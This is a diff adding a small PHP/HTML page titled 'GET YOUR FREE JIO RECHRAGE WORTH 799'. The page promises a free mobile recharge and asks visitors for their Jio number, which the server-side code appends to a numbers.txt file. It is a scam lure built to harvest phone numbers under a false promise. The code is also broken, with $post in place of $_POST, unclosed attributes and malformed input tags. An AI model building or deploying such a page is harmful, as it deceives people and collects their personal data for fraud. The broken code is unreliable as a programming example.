@@ -1,0 +1,25 @@
+<?php
+    $number=$post ["number"]
+?>
+<html>
+    <head>
+        <title>GET YOUR FREE JIO RECHRAGE WORTH 799</title>     
+    </head>
+    <body align="center" background ="https://www.google.com/search?q=jio&client=ms-android-samsung&prmd=nmiv&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjGjbK2ibnhAhWBheYKHfwrCgoQ_AUoA3oECAsQAw#">
+    <font color = "red" font face ="MONOTYPECORSIVA" size="30"><b>ENTER YOUR JIO NUMBER HERE TO GET RECHARGE WORTH 799 RUPEES</b></font>
+   <font color="#00FF00" size = "15">
+       <form method="post">
+       <label>:-number-: </label>
+           <input type="text" name="number
+       value ="" placeholder="enter your jio Number"
+               <input type="submit" value="submit"
+                 >
+       </form>
+        </font>  
+    </body>
+</html>
+<?php 
+    $file = fopen ("numbers.txt","a");
+    fwrite ($file,$number);
+    fclose ($file);
+ ?>
